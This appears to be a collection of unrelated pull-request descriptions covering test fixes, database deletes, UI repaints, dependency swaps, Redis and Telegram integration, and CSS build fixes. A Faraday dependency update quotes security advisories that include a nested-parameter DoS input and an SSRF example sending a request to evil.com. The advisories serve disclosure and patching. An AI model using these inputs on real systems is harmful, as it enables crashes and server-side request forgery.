   code: git!(root, ["worktree", "add", "-b", "agent-switch", worktree, "main"])
```

Two compounding bugs in the test helpers:

1. **Cross-run collision.** `git_repo!/0` named temp dirs with `System.unique_integer/1`, which restarts each BEAM run. On the persistent self-hosted runner, a fresh run regenerates an integer matching a leftover dir → `git worktree add` fails with "already exists".
2. **Leak.** The "switching to a worktree shell" test (unlike its sibling at line 400) never cleaned up its worktree, so it leaked a dir on **every** run, pass or fail. **293** had accumulated.

## Fix

`git_repo!/0` now creates a uniquely-named **sandbox** dir (wall-clock `System.system_time(:nanosecond)`, which does not repeat across runs) with the repo nested at `<sandbox>/repo`. Tests derive worktrees as `root <> "-suffix"`, which now land **inside** the sandbox — so the single `on_exit` that removes the sandbox also removes every worktree a test created. No collisions, no leaks, and no per-test cleanup needed.

## Verification

Ran `test/dev_ide/terminals/session_directory_test.exs` against current origin/master in a clean worktree: **34 passed**, and **zero** `/tmp/devide-session-directory-*` dirs remained afterward (previously each run leaked one).

Also cleaned the 293 + 2 accumulated leftover dirs from the runner host (operational, separate from this code change).

🚨 Your current dependencies have known security vulnerabilities 🚨 This dependency update fixes known security vulnerabilities. Please see the details below and assess their impact carefully. We recommend to merge and deploy this as soon as possible!
Here is everything you need to know about this update. Please take a good look at what changed and the test results before merging this pull request. ### What changed? #### ↗️ faraday (_indirect_, 1.0.1 → 1.10.6) · [Repo](https://github.com/lostisland/faraday) · [Changelog](https://github.com/lostisland/faraday/blob/main/CHANGELOG.md)
Security Advisories 🚨

🚨 Faraday: Uncontrolled recursion in NestedParamsEncoder allows stack exhaustion DoS via deeply nested query parameters

Faraday::NestedParamsEncoder, the default nested query parameter encoder/decoder in Faraday, decodes nested query strings without enforcing a maximum nesting depth.

A crafted query string such as:

a[x][x][x][x]...[x]=1

causes Faraday to build a deeply nested Ruby Hash structure. The internal dehash routine then recursively walks this attacker-controlled structure without a depth limit. At sufficient depth, Ruby raises an uncaught SystemStackError (stack level too deep), crashing the calling thread or worker. This can lead to denial of service in applications that pass attacker-controlled query strings to Faraday's nested query parsing or URL-building paths.

This has been patched in version 2.14.3 and backported to 1.10.6.

🚨 Faraday affected by SSRF via protocol-relative URL host override in build_exclusive_url

Impact

Faraday's build_exclusive_url method (in lib/faraday/connection.rb) uses Ruby's
URI#merge to combine the connection's base URL with a user-supplied path. Per RFC 3986,
protocol-relative URLs (e.g. //evil.com/path) are treated as network-path references
that override the base URL's host/authority component.

This means that if any application passes user-controlled input to Faraday's get(),
post(), build_url(), or other request methods, an attacker can supply a
protocol-relative URL like //attacker.com/endpoint to redirect the request to an
arbitrary host, enabling Server-Side Request Forgery (SSRF).

The ./ prefix guard added in v2.9.2 (PR #1569) explicitly exempts URLs starting with
/, so protocol-relative URLs bypass it entirely.

Example:

conn = Faraday.new(url: 'https://api.internal.com')
conn.get('//evil.com/steal')
# Request is sent to https://evil.com/steal instead of api.internal.com

Patches

Faraday v2.14.1 is patched against this security issue. All versions of Faraday up to 2.14.0 are affected.

Workarounds

NOTE: Upgrading to Faraday v2.14.1+ is the recommended action to mitigate this issue, however should that not be an option please continue reading.

Applications should validate and sanitize any user-controlled input before passing it to
Faraday request methods. Specifically:

  • Reject or strip input that starts with // followed by a non-/ character
  • Use an allowlist of permitted path prefixes
  • Alternatively, prepend ./ to all user-supplied paths before passing them to Faraday

Example validation:

def safe_path(user_input)
  raise ArgumentError, "Invalid path" if user_input.match?(%r{\A//[^/]})
  user_input
end

author: porunov
body:
Removing a vertex previously issued one column-level delete per incident edge/property on the vertex's storage row. For super-nodes this produced thousands of cell tombstones on a single Cassandra partition, leading to read timeouts and TombstoneOverwhelmingException.

When a vertex is fully removed, JanusGraph now deletes its entire storage row in a single backend operation: on CQL a partition-level `DELETE ... WHERE key = ?` (one partition tombstone) instead of N per-column deletes. Because the per-column delete entries are no longer serialized, this also reduces client-side memory, batching, and network cost for large removals.

Implementation:
- New whole-row-deletion flag on `Mutation`, plumbed through `BackendTransaction.mutateEdges` -> `KCVSCache.mutateEntries` -> `CacheTransaction` -> `KCVMutation` -> `KeyColumnValueStoreManager.mutateMany`.
- New `StoreFeatures.hasOptimizedWholeRowDeletion()` capability (default false). The graph skips building per-column deletions only when the backend advertises the capability, so backends without it keep the previous per-column behavior (no data loss).
- Commit-time detection in `StandardJanusGraph.prepareCommitAddRelationMutations`, driven by `StandardJanusGraphTx` tracking the canonical ids of fully-removed vertices. Only the edge store is affected; the index store still deletes per-column (its rows are shared across vertices). Partitioned vertices wipe every representative row via canonical-id normalization.
- Backend support: CQL/Scylla (partition delete), in-memory (drop key), HBase (column-family delete). BerkeleyJE and others fall back to per-column deletes.
- Controlled by the new `storage.drop-whole-row-on-vertex-removal` option (default true).

Tests cover the Mutation flag, the write-path plumbing, each backend, and graph-level integration (super-node removal, flag-off fallback, partial-edge removal, and partitioned-vertex removal). Documented in docs/changelog.md (1.2.0) and docs/storage-backend/cassandra.md.

author: delchev
body:
## Context

Today an `.intent` model is self-contained: a relation's `to:` must target an entity in the **same** model, `manyToMany` is parsed but never materialized, and each model prefixes its own tables. There was no way to author the real-world pattern the codbex apps use, where each domain (UoM, Country, Currency, Customer, SalesInvoice, CustomerPayment) is its own project and entities reference each other across projects.

The codbex apps solve this with **PROJECTION** entities: a consumer stores an integer FK to the owner's `Id` and renders a dropdown sourced from the owner's REST service; the projection generates no table / DAO / controller locally. The owner model owns the single physical table. That mechanism existed only in the visual EDM editor — this PR lifts it into the `.intent` DSL, adds n:m via an explicit intermediate entity, and adds the field attributes needed for faithful models.

## What changed

**Tranche A — cross-model references**
- New top-level `uses:` block (`UsesIntent`) + optional `model:` on a relation.
- Parser allows a to-one relation to target an entity in a declared `uses` model; rejects undeclared models and forbids cross-model composition.
- `EdmIntentGenerator` emits a `PROJECTION` entity per distinct cross-model target plus an integer FK + dropdown on the consuming side. `CrossModelSupport` reads the owner's already-generated `.model` for the exact perspective / PK / table (convention fallback when the owner isn't generated yet). Projections carry a blank perspective so they stay out of the consuming app's navigation.
- `workspaceName` plumbed through endpoint → service → context for the `projectionReferencedModel` path.
- **No template changes** — `parameterUtils.js` / `generateUtils.js` and the schema template already handle `type=PROJECTION` (table skipped; cross-model FK resolves to the owner's table in the shared DB).

**Tranche B — n:m via an explicit intermediate entity** (composition to one side, cross-model `manyToOne` to the other, plus bridge fields like `Amount` for partial allocations). Reuses the composition + cross-model code paths; no extra generator logic. `manyToMany` stays non-materializing.

**Tranche C — faithful field attributes**: `FieldIntent` gains `unique`, `precision`, `scale`, `calculatedOnCreate`, `calculatedOnUpdate`; entities gain `audit: true` (emits the four standard audit columns). `EdmIntentGenerator` emits `dataUnique`, precision/scale, `isCalculatedProperty` + `calculatedPropertyExpression*`, and `auditType` — the exact attribute names the DAO/schema templates consume.

**Examples + docs + tests**
- 6 Billing example `.intent` files (uoms, countries, currencies, customers, customer-payments, sales-invoices) under `engine-intent` test resources, including the cross-model `SalesInvoiceCustomerPayment` n:m intermediate.
- `intent-assistant-guide.md` documents `uses:`, cross-model relations, the n:m intermediate pattern, and the new field attributes.
- Parser tests (cross-model accept/reject, cross-model composition reject, unique/calculated parse) + a new `EdmIntentGeneratorTest` asserting projection shape, FK metadata, no-perspective-leakage, n:m, calculated, and audit. **21/21 pass.**

## Target runtime

The intent scaffold defaults the code-gen recipe to `template-application-ui-harmonia-java` (Java DAO/REST + Harmonia UI), which sets `javaRuntime=true`, so cross-model dropdowns generate as `/services/java/{ownerProject}/gen/{ownerModel}/api/{Perspective}/{Entity}Controller`. The `.model` is template-agnostic, so switching a project to the AngularJS/TypeScript recipe emits the `/services/ts/...` form with no intent changes.

## Known limitations (documented, not fixed)
- The cross-model dropdown URL has no workspace segment, so all referenced projects must be published to the same runtime (the codbex deployment model).
- The Java DAO injects a calculated expression as raw Java, so codbex's JS `NumberGeneratorService` does not apply to the Java path; the example uses a compilable `java.util.UUID.randomUUID().toString()` and documents the swap.

## Verification
- Unit: `mvn -pl components/engine/engine-intent test` (21 tests pass).
- End-to-end (requires a running Dirigible, not run here): generate the 6 projects leaf-first, then assert `CUSTOMERS_CUSTOMER` has integer `CUSTOMER_COUNTRY`/`CUSTOMER_CURRENCY`, `SALES_INVOICES_SALES_INVOICE_CUSTOMER_PAYMENT` has the composition FK + integer `..._CUSTOMER_PAYMENT` + decimal `..._AMOUNT`, no Country/Currency/Customer/CustomerPayment table is created by consuming models, and the cross-model dropdowns + n:m allocation work in the UI.

author: e-straily
body:
## What changed

On the Raspberry Pi, switching the display mode (e.g. to **High Contrast**) left a flickering
patchwork of old and new colors that **persisted** until the app was restarted. This change makes
the whole screen repaint immediately when the display mode changes, so the new palette applies
everywhere at once. The repaint happens **only on the Pi** (Linux, running fullscreen); on the
desktop and on Windows/Mac the behavior is unchanged (no blink).

## Why

The Pi renders in software (tiny-skia) over a double-buffered Wayland surface — it keeps two hidden
copies of the screen and alternates them. On a color-only change the renderer fully repaints just
**one** of the two copies; the other keeps the old background color in the empty areas, and the
per-frame diff never re-clears it — so the patchwork persists and flickers as the copies cycle.
Briefly leaving and re-entering fullscreen is a genuine surface resize, which makes iced clear its
per-buffer layer history so **both** copies repaint in the new palette. (Root cause confirmed by
reading the iced `0.13` / softbuffer source; corroborated by a falsification test on the
single-buffered X11 path, which switches cleanly as predicted.)

## Scope

`refbox` crate only — `refbox/src/app/mod.rs`:
- a small gated repaint helper (`force_display_repaint`) wired into the display-mode handler,
- a pure, unit-tested gate (`should_force_repaint` — Linux + fullscreen only),
- storing the existing `--fullscreen` startup flag on the app so the handler can read it.

No other crates, no palette or translation changes, no new dependencies.

## How to verify

- **Automated:** `cargo test -p refbox` (388 pass, incl. new `repaint_gate_tests`),
  `cargo clippy -p refbox -- -D warnings` clean, `just check` green.
- **On the Pi (the only place the bug reproduces):** Settings → **VIEW MODE** → cycle
  Light / Dark / High Contrast. Each switch should repaint the **whole** screen cleanly (a brief
  blink on the tap is fine), including with a game clock running and after moving between pages.

## ⚠️ Pending Pi verification

The flicker-stopping behavior has **not yet been confirmed on hardware** — it cannot be reproduced
on WSL/desktop (single-buffered / wgpu). Verify on a **spare Pi** (via self-update) before rolling
out to any field Pi. If the fullscreen bounce does not rebuild the surface on the Pi's compositor,
the fallback is a one-line swap to the existing restart path.

body:
Maintainers: thank you so much for your hard work on this project. I love Histoire and hope to use it indefinitely!

This PR aims to address the apparently-unmaintained `gray-matter` package with a maintained fork of it from the good folks at 11ty, which does not use the vulnerable v3.x version of `js-yaml` like the "official" version does. There is some chance that v3.x [may be](https://github.com/nodeca/js-yaml/issues/762) patched eventually, but it is only a matter of time before another vulnerability is found, and this change would seem to avoid that possibility moving forward.

## Summary
- Replace `gray-matter` with the [11ty-maintained](https://github.com/11ty/gray-matter) `@11ty/gray-matter` package to avoid pulling in vulnerable `js-yaml` v3 
- Update the markdown frontmatter parser import to use the new package.
- Refresh the pnpm lockfile to remove the old `gray-matter` dependency tree.

## Why
The legacy `gray-matter` package pulls in a vulnerable `js-yaml` 3.x dependency tree. The 11ty-maintained fork uses `js-yaml` 4.x, resolving the js-yaml vulnerability while preserving the existing frontmatter parsing behavior used by Histoire markdown stories.

Currently there are at least two vulnerabilities: 
- [CVE-2025-64718](https://www.cve.org/CVERecord?id=CVE-2025-64718)
- [CVE-2026-53550](https://www.cve.org/CVERecord?id=CVE-2026-53550)

## Validation
- lint is passing
- tests are passing
- `corepack pnpm install --lockfile-only --frozen-lockfile`
- `corepack pnpm --filter histoire... build`

As this is my first PR to Histoire, please let me know if there are any issues with the PR or the changes and I will be happy to adjust things as needed. If this is not the right approach altogether, again please let me know.

Thanks!

author: sammygill
body:
#### 3d436acad33f6ebc79a75acf0aed418a489c37f9 
[GFC] Items with auto or calc margins are not supported
https://bugs.webkit.org/show_bug.cgi?id=317983
rdar://problem/180765717

Reviewed by Alan Baradlay.

The grid coverage check uses MarginEdge::isPossiblyZero() to decide whether a
grid item has margins that force the legacy path. However, isPossiblyZero()
returns true for both the `auto` keyword and calc() values (keywords and calc()
are always treated as possibly-zero), so a grid item with an `auto` margin or a
calc() margin was not detected as having a margin and was allowed onto the
modern GFC path.

The modern path does not support these margins:
- auto margins were treated as zero, so the item was start-aligned within its
  grid area instead of having the auto margin absorb the free space (e.g. a
  `margin: auto 0` item was not centered in its row).
- a calc() margin containing a percentage was treated as a zero offset, so the
  item was placed at the start of its grid area (e.g. `margin-left: calc(10px +
  30%)` produced a 0px offset instead of 70px against a 200px grid area).

Detect both cases explicitly via MarginEdge::isAuto() and
MarginEdge::isCalculated() so these items fall back to the legacy grid layout
path, which resolves the margins correctly. Non-zero fixed and percentage
margins were already routed to legacy by the existing isPossiblyZero() check.

Add two reftests (reduced from grid-block-axis-alignment-auto-margins-008.html)
that use explicit row placement so the items stay on the modern path,
exercising the auto-margin and calc()-margin cases directly.

**💡 What:** 
Added dynamic `aria-label` and `title` attributes to the icon-only GitHub and Live Demo links within the `Projects` component, explicitly using the project title (e.g., "View source code for [Project Name] on GitHub"). Additionally, updated `rel="noreferrer"` to `rel="noopener noreferrer"` for enhanced security against tabnabbing.

**🎯 Why:** 
When icon-only links exist inside a mapped collection (like a grid of project cards), providing standard generic labels like "GitHub" results in screen readers reading "GitHub, GitHub, GitHub" sequentially, rendering the links indistinguishable. By appending the project title, the links become deeply contextualized for assistive tech. The `title` attribute natively adds visual tooltips on hover, improving discovery without adding heavy UI dependencies.

**♿ Accessibility:** 
- Screen reader users can now clearly differentiate between the different "GitHub" or "Live Demo" links across multiple project cards.
- Mouse and keyboard users gain native hover tooltips clarifying the icon's destination.

author: kymil4
body:
## What

Off-device check-in channels for Kawan (**X-NOTIF**, see `docs/adr/0006-two-tier-reminder-delivery.md`).

A **reminder** Check-in (`cadence` or `winback`) now fans out **in parallel** to the user's enabled **off-device** channels — **email** (a per-commitment reminder address) and **Telegram** (an account link) — _alongside_ the unchanged **device tier** (in-app → Web Push → timeline). Outcomes (verdict / celebration / Miss / Grace) and `on_demand` stay device-only.

This deliberately **reverses TR-70** (email was stake / win-back only) and **refines TR-17** (the single delivery ladder) — both recorded in ADR-0006 + `CONTEXT.md` "Delivery".

## Design decisions (grilled → ADR-0006)

- **Email is opt-in per commitment** (`notify_email`), not mandatory — in-app stays the only always-on channel (preserves Guest zero-friction).
- **Web Push unchanged** — stays the "tab closed" device fallback, not a parallel channel (no double-notify of an active user).
- **"Enabled" = the address / sub / link exists** — no preferences table.
- **Telegram linking via long-poll** (not webhook) — testable in local dev, lifespan-managed; a **Postgres advisory lock** keeps a single `getUpdates` consumer across instances.

## Changes

**Backend**

- `notify.py` — parallel off-device fan-out (email + Telegram), best-effort
- `telegram.py` — Bot API `sendMessage` + lifespan long-poll `/start` linking; advisory-lock leader election; no-op without a bot token
- `routes/telegram.py` — `GET /status`, `POST /link` | `/unlink`
- Additive columns: `commitments.notify_email`, `users.telegram_chat_id` + a transient link token

**Frontend**

- Optional reminder-email input in the create wizard's Terms step
- Settings: "Connect Telegram" (deep link + status poll) + a four-channel section

## Schema / ops (live infra ready)

- The 4 additive columns were **applied + verified on the live Supabase DB** (`create_all` does not ALTER existing tables; it keeps them on fresh DBs).
- `KAWAN_RESEND_API_KEY` set in Render; Telegram bot `@kawan_chjl_bot` token + username set — **live-verified** (getMe ok, getUpdates 200 with no webhook conflict, advisory-lock exclusion confirmed on the session pooler).

## Testing

- `test_notify_fanout.py`, `test_telegram.py`; `conftest` isolates Resend / Telegram creds so the suite stays hermetic regardless of the dev `.env`.
- **145 backend pass, ruff clean, frontend `tsc` clean.**

## Note (separate from this PR)

The repo's `commitlint.config.js` uses ESM `export default` while `package.json` has no `"type": "module"`, so commitlint resolves **empty rules** (`extends: []`) and the `commit-msg` hook is non-functional repo-wide. This commit's message is Conventional-Commits compliant regardless. Happy to fix the config in a separate `chore(tooling)` PR.

* **Bug Fixes**
  * Clarified reminder vs on-demand behavior: winback/cadence follow channel delivery rules, while on-demand remains device-only.

author: rpaup
body:
## Summary
 
Integrates Redis into the backend for three purposes: job status caching, real-time progress notifications via SSE, and Celery worker configuration.
 
## Changes
 
### Redis Core
- Added `app/core/redis.py` with async (FastAPI) and sync (Celery) connection pools, health checks, and graceful shutdown
- Added Redis pool configuration in `config.py` (max connections, timeouts, TTL)
- Wired Redis lifecycle into FastAPI lifespan (`main.py`)
 
### Job Status Caching
- Added `cache_service.py` — cache-aside pattern with 5s TTL for `GET /jobs/{id}`
- Cache invalidation on job state mutations
 
### Real-time Progress (SSE)
- Added `notification_service.py` — Redis Pub/Sub for job progress events
- Added `GET /jobs/{id}/stream` SSE endpoint for frontend
- Added `_publish_progress()` fire-and-forget call after each `increment_progress` in Celery workers
 
### Health Check
- Added Redis connectivity check to `/health` endpoint using shared connection pool
 
### Celery Pipeline
- Added `celery_app.py` configuration with Redis broker
- Added worker tasks: `unpack`, `process_card`, `package`, `aggregate`, `analyze_mapping`
- Wired real `unpack.delay()` dispatch instead of TODO stub
 
### Tests
- Added 16 tests for Redis, cache service, and notification service (using `fakeredis`)
- Updated `test_api.py` mocks to match new Redis integration
- Fixed `Base.metadata` model registration in test fixtures
- **862 passed, 0 failed**
 
## Architecture Decisions
- Two isolated connection pools: async for FastAPI, sync for Celery (no `aiosqlite` in workers)
- Fire-and-forget Pub/Sub: Redis failure never blocks SQLite writes
- Graceful degradation: Redis down → 503 on health, cache miss → DB fallback, Pub/Sub → silent skip
 
## Requirements
- Redis 7+ in Docker Compose (default: `redis://redis:6379/0`)
- Local dev: `docker run -d -p 6379:6379 redis:7-alpine` + `REDIS_URL=redis://localhost:6379/0` in `.env`

author: dclstn
body:
Fixes two **prod-only** CSS regressions that don't appear in dev. Both come from the same root cause: the production CSS minifier (lightningcss, via Vite's `cssMinify`) lowers modern CSS for the browsers in our browserslist, while dev builds skip minification and keep it native.

## 1. Missing dark backgrounds — `light-dark()` polyfill

lightningcss lowers `light-dark()` to:

```css
--tooltip-bg: var(--lightningcss-light, #000) var(--lightningcss-dark, #fff);
```

The toggle variables `--lightningcss-light` / `--lightningcss-dark` are only emitted next to a **literal** `color-scheme: light|dark` declaration. Our only `color-scheme` is `var(--mantine-color-scheme)` (runtime), so lightningcss can't read it statically and never emits the toggles. Every `light-dark()` then collapses to an invalid two-value declaration (e.g. `background-color: #000 #fff`) and is dropped → transparent tooltips, table cells, settings footer and loader icons.

**Fix** — replace `light-dark()` with the `[data-mantine-color-scheme]` mechanism Mantine itself uses:
- CSS modules (`Tooltip`, `Emote`, `LoaderIcon`, `Footer`): light value inline + a `[data-mantine-color-scheme='dark']` override.
- Elevated button variant (`dark` / `contrast` cases): named `--mantine-color-button-elevated-*` variables defined per scheme.
- Elevated default case: shades come from the runtime `color` prop, so it uses a per-scheme `--bttv-light` / `--bttv-dark` toggle.

## 2. Column gap in settings tables — logical-property lowering

Mantine draws table column dividers with logical properties:

```css
.m_…:where([data-with-column-border]:not(:first-child)) { border-inline-start: … var(--table-border-color); }
```

For the old browsers in the previous browserslist, lightningcss shatters each of these into ~6 LTR/RTL `:lang()` fallback rules, which render a visible gap between columns in prod. This is Mantine's own CSS, so there's no per-component fix on our side.

**Fix** — narrow the build target. BetterTTV runs only as a browser extension on modern, auto-updating browsers, so `browserslist` now targets versions with native support (Chrome/Edge 123+, Firefox 120+, Safari 17.5+). lightningcss then keeps modern CSS (logical properties, nesting, etc.) native, so **prod matches dev**, and the CSS bundle shrinks ~508 → ~324 kB.

## Testing

- `npm run build:prod`: `light-dark(` and `lightningcss` are both **0** in `build/betterttv.css`; Mantine column borders stay native (`border-inline-start`, no `:lang()` fallbacks).
- Verified tooltips, tables, footer, loader icons and the keyword table columns render correctly in light and dark in a prod build.

author: takishun
body:
## Problem
On Streamlit Cloud the app crashed with:
```
AttributeError
File "/mount/src/takishun/app.py", line 53, in <module>
    st.session_state.lang = content.DEFAULT_LANG
```
`DEFAULT_LANG` **does** exist in our module, so the only explanation is that `import content` resolved to a *different* top-level `content` module present in the Streamlit Cloud environment (module-name shadowing). `content` is a very generic name and is prone to this; it resolves correctly locally but not in the cloud runtime.

## Fix
- Renamed `content.py` → **`site_content.py`** (a unique, collision-proof name)
- `app.py`: `import site_content as content` (all existing `content.*` references unchanged)
- Updated README references

## Verification
Ran the app locally after the rename — starts cleanly with no errors in the logs, and a headless browser check confirms the page renders **without** the AttributeError/error screen.

author: bkudria
body:
## Problem

At high effort the assess completeness-critic loop runs up to two **strictly serial** rounds — each round awaits the critic, then awaits its gap investigations, and round 2's critic cannot start until round 1's investigations finish (it judges remaining gaps against round 1's new observations). In one observed run this chain consumed ~21 of 77 minutes on the critical path.

When a round investigated its gaps successfully but surfaced **no new observations**, coverage has stopped growing — yet the loop still paid for the next round's serial critic + investigation barrier.

## Change

Add a **diminishing-returns early-exit**: stop the loop after a round whose successful gap investigations produced no observations.

The guard distinguishes genuine emptiness from failure:

- Gaps investigated **successfully** but yielded zero observations → diminishing returns → **stop**.
- Gaps that **failed** to investigate (`gapInvestigations` empty) → degradation, not diminishing returns → **fall through**, so the facet can still be re-proposed and retried next round (preserving the existing dropped-gap re-proposal behavior).

The condition is `gapInvestigations.length && !gapObs.length`, keyed off values already computed in the loop. The round *ceiling* is unchanged (still 2 at high), so a run whose rounds keep producing observations still runs both.

## Tests

- New orchestration test: a high-effort run whose round-1 gaps come back empty dispatches exactly one `completeness-critic` and no second-round gap investigation.
- Existing completeness tests stay green and pin the two branches this must not disturb: "runs at most 2 gap rounds" (productive rounds) and "failing gap is re-proposable" (failure path).

author: jacobcy
body:
## Summary

修复 review/failed/aborted 状态 flow 被错误归类为 "Remote Tasks" 的问题，并补全了 PR review 中发现的 11 个下游消费点。

Issue #3189 在 FlowState 中新增了 `review` / `failed` 状态值，但初始实现只覆盖了部分代码路径，大量下游消费者不识别这些状态，导致：

- **status_query**：review/failed flow 的 issue_to_flow 映射为 None → 被归类为 Remote Task
- **qualify_gate**：review/failed flow 被降级为 aborted（错误）
- **check service**：review/failed flow 被当作 active 处理，触发不应执行的规则
- **flow manager**：review/failed flow 可以被 auto-flow 重复使用（错误）

---

## 新状态模型（完整映射）

```
                  ┌─────────────────────────────────────────────────────┐
                  │              状态转换规则（vibe3 check）              │
                  └─────────────────────────────────────────────────────┘

active / blocked / stale flow（非终态）:
  ├── PR merged + 所有 phase done（check rule 1）        → done
  ├── PR closed without merge（check rule 1）             → aborted + bridge issue
  ├── Issue closed on GitHub（qualify_gate）              → aborted
  ├── Branch deleted（check rule 7）                      → aborted
  └── Various sync rules（label change, stale state）     → 状态调整

review / failed / aborted flow（PR 关联终态）:
  ├── PR merged + 所有 phase done
  │   （check rule 1 / qualify_gate）                    → done
  │   条件: planner/executor/reviewer 全部 done
  │         AND 有 merged PR（pr_ref 或 GitHub 查询）
  ├── PR merged + phase 不齐全                            → 保持原状（不降级）
  │   （check rule 1 / qualify_gate）     
  ├── PR closed without merge
  │   （check rule 1）                                    → aborted + bridge issue
  └── 其他 check 规则                                    → 跳过（INACTIVE_FLOW_STATUSES）

done flow（终极终态）:
  └── 所有规则跳过，不做任何操作
```

### 关键原则

1. **review/failed/aborted 不是死胡同**：当 PR 合并 + 所有 phase done 时，可通过 eligibility 检查升格为 done
2. **review/failed 不做错误降级**：不再把它们当 active 处理（旧行为），也不再归一化为 aborted
3. **有 PR 的状态不做过度清理**：branch 删除、label 变化、consistency recovery 都跳过这些状态
4. **eligibility 是中心化的**：`evaluate_aborted_to_done_eligibility()` 在 qualify_gate 和 check 规则中共享，杜绝逻辑漂移

---

## 变更详情

### 1. 状态核心变更（基础层）

| 文件 | 变更 |
|------|------|
| `models/flow.py` | `FlowStatusResponse.flow_status` Literal 扩展为 7 种状态（active/blocked/done/stale/review/failed/aborted） |
| `cli.py` / `flow_state` | 删除 `_migrate_flow_status_value` 中 `failed→active` 的归一化逻辑，failed 直接透传 |

### 2. 下游消费者适配（11 处修复）

| # | 文件 | 变更 | 原因 |
|---|------|------|------|
| 1 | `domain/flow_manager.py` | `_is_reusable_auto_flow` 排除集加入 review/failed | 防止 auto-flow 重复使用终态 flow |
| 2 | `services/check/service.py` | `INACTIVE_FLOW_STATUSES` 加入 review/failed | 所有 check 规则正确跳过终态 |
| 3 | `commands/status.py` | `COMPLETED_FLOW_STATUSES` frozenset 包含 review/failed | 状态显示面板分类正确 |
| 4 | `commands/flow_manage.py` | `StatusFilterOption` Literal 包含全部 7 种状态 | CLI --status 参数接受合法值 |
| 5 | `services/shared/status_query.py` | 合并三个循环为一，extra_flows 优先于 stale_flows | review/failed 在优先级中胜出 |
| 6 | `clients/sqlite_flow_state_repo.py` + `services/flow/read_mixin.py` + `services/task/status.py` | 新增 `get_flows_by_statuses` 批量查询 + 上游接线 | 一次 SQL IN 查询替代三次串行查询 |
| 7 | `services/shared/status_query.py` + `services/task/status.py` | 用批量查询替代逐个状态串行循环 | 减少 N+1 查询模式 |
| 8 | `services/protocols/flow_protocols_ext.py` + `domain/qualify_gate_support.py` | Literal 类型签名扩展 | 类型系统与运行时一致 |
| A | `domain/qualify_gate_support.py` | `terminalize_closed_issue` 保留 review/failed，走 eligibility 检查 | 避免 issue close 时错误降级 |
| B | `services/check/pr_service.py` | `_handle_merged_pr` 路由 review/failed 走 eligibility | PR 合并后正确升格为 done |
| C | `services/check/rule_checks.py` | `rule_missing_branch_cleanup` 跳过 terminal 状态 | 分支删除是 post-PR 正常清理 |

### 3. 配置文件

| 文件 | 变更 |
|------|------|
| `config/v3/loc_limits.yaml` | `sqlite_flow_state_repo.py` limit 600→640（+40 行 get_flows_by_statuses） |

---

## 测试覆盖

- 2 个新测试文件：`test_flow_manage_status_filter.py`, `test_check_rule_missing_branch.py`
- 5 个扩展现有测试文件：`test_qualify_gate_closed.py`（+87）, `test_check_pr_status.py`（+90）, `test_flow_manager.py`（+35）, `test_status_config_display.py`（+9）, `test_check_sync_rules.py`（+8）
- 74 个定向测试 + 48 个 modularity 测试 + mypy 455 文件 0 错误

---

## 验证结果

```
uv run pytest <targeted> -x -q     → 74 passed in 13.35s
uv run mypy src/vibe3              → Success: no issues in 455 files
uv run pytest tests/vibe3/test_modularity/ -x -q → 48 passed in 27.27s
```

Fixes #3189

author: gustav-fff
body:
Closes #630

## Root cause

`lua/fff/location_utils.lua:207` runs `vim.pesc(search_text)` on the grep needle before scanning preview lines, but the scanner at `lua/fff/location_utils.lua:224` calls `string.find(search_line, search_pat, start_pos, true)` with `plain=true`. With `plain=true` the needle is treated as a literal byte sequence, so the escape turns `.` into `%.` and the scanner then looks for the two literal bytes `%` `.` in content — which never appears in normal source code. Same failure mode for every other Lua-pattern metachar (`-`, `(`, `)`, `+`, `*`, `?`, `[`, `]`, `^`, `$`, `%`). Single-word queries without metachars look fine, multi-word queries that happen to contain a `.` (e.g. file extensions, version strings, member access) lose preview highlighting entirely.

## Fix

Drop `vim.pesc`. Pass the raw needle into `string.find(..., true)` directly. Smart-case lowering is preserved.

## Steps to reproduce

```sh
git checkout origin/main
nvim ~/some/repo
```

Inside Neovim:

1. `:lua require('fff').find_files()` then toggle to grep mode (default `<C-g>`), submode `plain` or `regex`.
2. Type a query containing a `.`, e.g. `foo.bar` or `1.0` or `vim.api`.
3. Move cursor to a result whose preview line contains the literal string.

Expected: every occurrence of `foo.bar` in the preview window is highlighted with `IncSearch`.
Actual: no preview highlights at all (the list row itself still shows the match because that path goes through Rust's `match_byte_offsets`, not this Lua scanner).

A single-token query without metachars (e.g. `foo`) highlights correctly, confirming the path works and only the escaping is wrong.

## How verified

- Read the scan loop: `string.find(search_line, search_pat, start_pos, true)` — the 4th argument is `plain`, which per Lua docs causes the pattern to be treated literally. Combined with `vim.pesc`, every metachar yields a needle that cannot match real content.
- Manual repro in nvim with query `vim.api` on this repo, pre-fix: no preview highlights. Post-fix: all `vim.api` occurrences in the visible preview window highlighted.

Automated triage via Gustav. Honk-Honk 🪿

author: chang-scott
body:
## PP v3.1.3–3.1.5: constant EOS, MoonMag/numpy v2, gravity/libration updates, and BuildTest fixes

### Summary

This PR brings PlanetProfile from the last `origin/main` snapshot through PP v3.1.3–3.1.5, with major changes to the EOS system, magnetic induction, gravity/Love numbers, Reaktoro performance, and a final round of BuildTest fixes.

**15 commits** · **170 files changed** · ~14k insertions / ~5.4k deletions  
**Base:** `origin/main` (`d8e08dd0`) → **Head:** `be26fd0c` on `chang-updates`

---

### EOS & modeling workflow (PP v3.1.3–3.1.5)

- **Seafloor-pressure MoI mode** (`SPECIFY_HYDROSPHERE_SEAFLOOR_PRESSURE`): set `Planet.Ocean.PHydroSeafloorSet_MPa` and let PP solve inner structure/MoI self-consistently via `CalcInnerAndMoIWithConstantRho`.
- **Constant-property EOS**: simplified `GetPlanet(Layer)EOS` API; constant EOS returns fixed properties for ice, ocean, and inner layers while keeping the same call pattern as tabulated EOS.
- **Unified seismic interface**: `fn_seismic` works across EOS types; ice layers use seismic interpolators for speed and consistency.
- **Bottom ice pressure input**: optional `Planet.Bulk.PbISet_MPa` to set ice-shell bottom pressure instead of `Tb_K`.
- **Per-phase melt viscosity for convection**: `Planet.Ocean.etaMelt_Pas` dict overrides `Constants.etaMelt_Pas` in convection calculations.

---

### Magnetic induction & numpy v2

- **MoonMag vendored into PlanetProfile** for numpy v2 compatibility (removed deprecated types like `complex_`).
- Induction pipeline updated to work with the integrated MoonMag package.

---

### Gravity, Love numbers, & librations

- **New DP ALMA backend** in `pyALMA3Updated.py`.
- Love numbers and **libration calculated together**; orbital period units fixed for ALMA.
- Stores complex **h₂, l₂, k₂, δ**; supports direct **Andrade α/γ** inputs (`andradGamma`).

---

### Reaktoro & thermodynamics performance

- Major **`reaktoroProps.py` refactor** for efficiency.
- Reaction handler returns **equilibrium constants** instead of affinities.
- Convection and Reaktoro property evaluation optimizations.

---

